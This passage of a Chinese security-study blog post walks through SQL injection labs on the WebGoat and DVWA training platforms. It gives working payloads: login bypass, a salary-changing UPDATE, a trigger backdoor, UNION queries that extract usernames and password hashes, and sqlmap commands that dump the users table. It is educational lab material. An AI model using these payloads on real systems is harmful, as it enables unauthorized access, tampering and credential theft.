<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861388823.png" alt="1565861388823"></p>
</li>
<li><p>查看网页源码，发现输入的密码被限制最大长度为<code>8</code>个字符</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861415462.png" alt="1565861415462"></p>
</li>
<li><p>将网页源码中最大长度修改为<code>20</code>，然后在输入：<code>‘</code><br><code>or 1=1 --</code>，点击<code>Login</code>后，成功绕过密码，显示登录成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861522793.png" alt="1565861522793"></p>
</li>
<li><p>在左侧菜单中找到<code>string SQL injection</code>中的<code>Stage 3: Numeric SQL Injection</code>并单击，根据网页提示，需要以<code>employee</code>账户的用户名<code>Larry</code>进行登录，绕过权限限制，浏览<code>boss</code>的账户信息</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861561587.png" alt="1565861561587"></p>
</li>
<li><p>在密码输入栏输入：<code>Larry</code>，成功登录</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861581845.png" alt="1565861581845"></p>
</li>
<li><p>将使用的火狐浏览器设置为手动代理，地址为<code>127.0.0.1</code>，端口为<code>8008</code>。点击<code>ViewProfile</code>，这时<code>WebScarab</code>会弹出<code>Edit Request</code>窗口，代理设置生效，浏览器的请求经过代理转发。在<code>URLEncoded</code>栏中添加一条参数<code>employee_id</code>，内容是：<code>101 or 1=1 order by salary desc</code>，点击<code>Accept changes</code>提交更改，绕过权限限制，<code>employee</code>账户<code>Larry</code>成功浏览<code>boss</code>的账户信息</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861666493.png" alt="1565861666493"></p>
</li>
</ol>
<h1 id="Database-Backdoors"><a href="#Database-Backdoors" class="headerlink" title="Database Backdoors"></a>Database Backdoors</h1><ol>
<li><p>在左侧菜单中找到<code>Database Backdoors</code>并单击。根据提示，<code>User ID</code>为<code>101</code>。这个页面可以看到自己的<code>password</code>, <code>ssn</code>和<code>salary</code>。我们需要使用一个易受攻击的字段来创建两条<code>SQL</code>语句并尝试注入另一个更新，将工资更新到更高的级别</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861755893.png" alt="1565861755893"></p>
</li>
<li><p>在输入框中输入<code>101 OR 1=1</code>，尝试注入，结果显示所有<code>User ID</code>的信息，注入成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861777502.png" alt="1565861777502"></p>
</li>
<li><p>选择<code>User ID</code>为<code>105</code>，将他的<code>Salary</code>由<code>50000</code>更改为<code>900000</code>，输入的内容为：<code>103;UPDATE employee SET salary=900000 WHERE userid=105</code>，点击<code>Submit</code>，显示注入成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861836101.png" alt="1565861836101"></p>
</li>
<li><p>接下来是创建一个后门，根据提示，输入：<code>105; CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email = &#39;john@hackme.com&#39; WHERE userid = 105</code>，点击<code>Submit</code>，显示注入成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861901321.png" alt="1565861901321"></p>
</li>
</ol>
<h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><p>针对<code>DVWA</code>演练平台，在<code>SQL Injection</code>攻击实验中，且要求在低级和中级安全级别中，获取用户信息表中全部的用户名及口令信息，并尝试将数据库所有库表数据全部拖出。</p>
<p>在浏览器中输入<code>http://192.168.88.149 /dvwa</code>进入<code>DVWA</code>平台，输入用户名<code>admin</code>，密码<code>password</code>，成功登录平台</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861980984.png" alt="1565861980984"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861986023.png" alt="1565861986023"></p>
<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h3 id="安全级别低级"><a href="#安全级别低级" class="headerlink" title="安全级别低级"></a>安全级别低级</h3><ol>
<li><p>进行安全级别设置</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862043052.png" alt="1565862043052"></p>
</li>
<li><p>选择<code>SQL Injection</code>，输入<code>ID</code>为<code>1</code>，得到结果如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862076676.png" alt="1565862076676"></p>
</li>
<li><p>尝试输入<code>‘ or 1=1--</code>，得到报错信息，说明表单存在注入漏洞且不是数字型注入</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862098254.png" alt="1565862098254"></p>
</li>
<li><p>尝试字符型注入，输入<code>1’ or ‘1’=’1</code>，成功遍历数据库中的内容</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862121610.png" alt="1565862121610"></p>
</li>
<li><p>测试查询信息列数，输入<code>1’ order by x -- </code> </p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862152256.png" alt="1565862152256"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862157243.png" alt="1565862157243"></p>
<p>当测试到<code>3</code>时，出现报错信息，说明查询结果值为<code>2</code>列</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862174858.png" alt="1565862174858"></p>
</li>
<li><p>输入<code>1&#39; union select 1,2 --</code> ，确定字段的顺序为<strong>First name</strong>，<strong>Surname</strong></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862222733.png" alt="1565862222733"></p>
</li>
<li><p>输入<code>1’ union select 1,database() --</code> ，得知数据库名为<code>dvwa</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862284087.png" alt="1565862284087"></p>
</li>
<li><p>输入<code>1&#39; union select 1,table_name from information_schema.tables where table_schema=&#39;dvwa&#39;--</code> ，得知数据库两个表名为<code>guestbook</code>和<code>users</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862325209.png" alt="1565862325209"></p>
</li>
<li><p>选择其中的<code>users</code>表，输入``1’<code> </code>union select 1,column_name from information_schema.columns where table_name=’users’–<code> ，查询</code>user`表的字段名</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862367139.png" alt="1565862367139"></p>
</li>
<li><p>只需要得到用户名和密码，因此输入``1’ union select user,password from users–` ，结果如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862400235.png" alt="1565862400235"></p>
<p>其中密码是<code>md5</code>加密，可以使用解码网站解密，如<code>5f4dcc3b5aa765d61d8327deb882cf99</code>解密后为<code>password</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862422877.png" alt="1565862422877"></p>
</li>
</ol>
<h3 id="安全级别中级"><a href="#安全级别中级" class="headerlink" title="安全级别中级"></a>安全级别中级</h3><ol>
<li><p>进行安全级别设置</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863222560.png" alt="1565863222560"></p>
</li>
<li><p>尝试输入<code>1’ or ‘1’=’1</code>，发现报错信息，可以发现安全级别为中级时，对字符进行转义处理</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863258617.png" alt="1565863258617"></p>
</li>
<li><p>尝试数字型注入，输入<code>1 or 1=1</code>，成功查询到所有的数据</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863306258.png" alt="1565863306258"></p>
</li>
<li><p>与低级类似，输入<code>1 union select 1,database() --</code> ，得知数据库名为<code>dvwa</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863334915.png" alt="1565863334915"></p>
</li>
<li><p>同样，输入<code>1 union select user,password from users--</code> ，得到用户名和密码，其中密码是<code>md5</code>加密，可以使用解码网站解密</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863362085.png" alt="1565863362085"></p>
</li>
</ol>
<h2 id="SQLMAP工具注入"><a href="#SQLMAP工具注入" class="headerlink" title="SQLMAP工具注入"></a><code>SQLMAP</code>工具注入</h2><h3 id="安全级别低级-1"><a href="#安全级别低级-1" class="headerlink" title="安全级别低级"></a>安全级别低级</h3><ol>
<li><p>进行安全级别设置</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862043052.png" alt="1565862043052"></p>
</li>
<li><p>输入<code>id</code>为<code>1</code>，使用<code>URL</code>在<code>SQLMAP</code>中尝试：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">192.168</span><span class="number">.88</span><span class="number">.149</span>/dvwa/vulnerabilities/sqli/?<span class="built_in">id</span>=<span class="number">1</span>&amp;Submit=Submit<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>发现跳转到登陆界面，需要加上<code>cookie</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862650413.png" alt="1565862650413"></p>
</li>
<li><p>在浏览器中查看<code>cookie</code>并记录</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862664106.png" alt="1565862664106"></p>
</li>
<li><p>在<code>SQLMAP</code>目标<code>URL</code>带上<code>cookie</code>重新尝试：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87 057104&quot;</span></span><br></pre></td></tr></table></figure>

<p>注入成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862750086.png" alt="1565862750086"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862761063.png" alt="1565862761063"></p>
</li>
<li><p>在命令行中输入：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104&quot;</span> --dbs</span><br></pre></td></tr></table></figure>

<p>列举数据库名称有：<code>dvwa</code>、<code>information_schema</code>、<code>mysql</code>、<code>owasp10</code>、<code>wackopicko</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862837386.png" alt="1565862837386"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862843842.png" alt="1565862843842"></p>
</li>
<li><p>在命令行中输入：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104&quot;</span> -D dvwa –tables </span><br></pre></td></tr></table></figure>

<p>选择其中的<code>dvwa</code>库查看表信息,发现有两个表，分别是：<code>guestbook</code>和<code>users</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862931713.png" alt="1565862931713"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862940712.png" alt="1565862940712"></p>
</li>
<li><p>在命令行中输入：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104&quot;</span> -D dvwa -T users --columns</span><br></pre></td></tr></table></figure>

<p>选择<code>users</code>表，查看表中的列</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863006027.png" alt="1565863006027"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863010978.png" alt="1565863010978"></p>
</li>
<li><p>在命令行中输入：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104&quot;</span> -D dvwa -T users -C user,password --dump</span><br></pre></td></tr></table></figure>

<p>选择其中的<code>user</code>，<code>password</code>进行查看，可得到全部用户名和密码,其中密码为<code>md5</code>加密，可以通过解码网站破解</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863074071.png" alt="1565863074071"></p>
</li>
</ol>
<h3 id="安全级别中级-1"><a href="#安全级别中级-1" class="headerlink" title="安全级别中级"></a>安全级别中级</h3><ol>
<li><p>进行安全级别设置</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863222560.png" alt="1565863222560"></p>
</li>
<li><p>在SQLMAP目标url带上cookie重新尝试：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87 057104&quot;</span></span><br></pre></td></tr></table></figure>

<p>注入成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863427938.png" alt="1565863427938"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863433020.png" alt="1565863433020"></p>
</li>
<li><p>在命令行中输入：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104&quot;</span> --dbs</span><br></pre></td></tr></table></figure>

<p>列举数据库名称有：<code>dvwa</code>、<code>information_schema</code>、<code>mysql</code>、<code>owasp10</code>、<code>wackopicko</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863487711.png" alt="1565863487711"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863498957.png" alt="1565863498957"></p>
</li>
<li><p>在命令行中输入：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.88.149/dvwa/ vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104&quot;</span> -D dvwa --tables</span><br></pre></td></tr></table></figure>

<p> 选择其中的<code>dvwa</code>库查看表信息,发现有两个表，分别是：<code>guestbook</code>和<code>users</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863540630.png" alt="1565863540630"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863544746.png" alt="1565863544746"></p>
</li>
<li><p>在命令行中输入：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -<span class="string">u&quot;http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104&quot;</span> -D dvwa -T users --columns</span><br></pre></td></tr></table></figure>

<p>选择<code>users</code>表，查看表中的列</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863584752.png" alt="1565863584752"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863588715.png" alt="1565863588715"></p>
</li>
<li><p>在命令行中输入：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104&quot;</span> -D dvwa -T users -C user,password --dump</span><br></pre></td></tr></table></figure>

<p>选择其中的<code>user</code>，<code>password</code>进行查看，可得到全部用户名和密码,其中密码为<code>md5</code>加密，可以通过解码网站破解</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863634151.png" alt="1565863634151"></p>
</li>
</ol>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>李钰璕
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://leeyuxun.github.io/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C.html" title="SQL注入实验">https://leeyuxun.github.io/SQL注入实验.html</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-cn" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fa fa-tag"></i> SQL注入</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C.html" rel="prev" title="漏洞挖掘与模糊测试实验">
      <i class="fa fa-chevron-left"></i> 漏洞挖掘与模糊测试实验
    </a></div>
      <div class="post-nav-item">
    <a href="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA%E5%AE%9E%E9%AA%8C.html" rel="next" title="格式化输出实验">
      格式化输出实验 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="nav-number">1.</span> <span class="nav-text">实验目的</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AEWebGoat%E4%B8%8EWebScarab"><span class="nav-number">2.</span> <span class="nav-text">安装和配置WebGoat与WebScarab</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#String-SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">String SQL注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Numeric-SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">Numeric SQL注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Blind-SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">5.</span> <span class="nav-text">Blind SQL注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Log-Spoofing-%E6%97%A5%E5%BF%97%E6%AC%BA%E9%AA%97"><span class="nav-number">6.</span> <span class="nav-text">Log Spoofing(日志欺骗)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XPATH%E6%B3%A8%E5%85%A5"><span class="nav-number">7.</span> <span class="nav-text">XPATH注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LAB-SQL-Injection"><span class="nav-number">8.</span> <span class="nav-text">LAB:SQL Injection</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Database-Backdoors"><span class="nav-number">9.</span> <span class="nav-text">Database Backdoors</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%9D%E8%80%83%E9%A2%98"><span class="nav-number">10.</span> <span class="nav-text">思考题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="nav-number">10.1.</span> <span class="nav-text">手工注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E7%BA%A7%E5%88%AB%E4%BD%8E%E7%BA%A7"><span class="nav-number">10.1.1.</span> <span class="nav-text">安全级别低级</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E7%BA%A7%E5%88%AB%E4%B8%AD%E7%BA%A7"><span class="nav-number">10.1.2.</span> <span class="nav-text">安全级别中级</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLMAP%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5"><span class="nav-number">10.2.</span> <span class="nav-text">SQLMAP工具注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E7%BA%A7%E5%88%AB%E4%BD%8E%E7%BA%A7-1"><span class="nav-number">10.2.1.</span> <span class="nav-text">安全级别低级</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E7%BA%A7%E5%88%AB%E4%B8%AD%E7%BA%A7-1"><span class="nav-number">10.2.2.</span> <span class="nav-text">安全级别中级</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="李钰璕"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">李钰璕</p>
  <div class="site-description" itemprop="description">安全学习笔记</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">89</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">115</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Leeyuxun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Leeyuxun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:leeyuxun@163.com" title="E-Mail → mailto:leeyuxun@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
      </span>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        <!--

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">李钰璕</span>
</div>
-->

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

  

</body>
</html>
